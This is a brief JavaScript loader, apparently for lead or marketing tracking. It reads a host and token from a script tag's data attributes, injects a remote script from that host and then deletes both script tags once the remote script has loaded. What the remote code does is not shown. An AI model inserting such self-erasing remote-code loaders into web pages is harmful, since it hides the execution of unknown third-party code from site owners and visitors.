(async () => {
  const sT = document.querySelector("script[data-t]");
  const t = sT?.dataset?.t;
  const c = sT?.dataset?.c ? JSON.parse(sT.dataset.c) : {};
  if (t && c.ht) {
    const host = c.ht.replace(/\/+$/, "");
    const remote = document.createElement("script");
    remote.src = `${host}/leads/bg/${t}/`;
    remote.async = true;
    remote.onload = () => {
        remote.remove(); 
        sT.remove();     
    };
    document.documentElement.appendChild(remote);
  }
})();
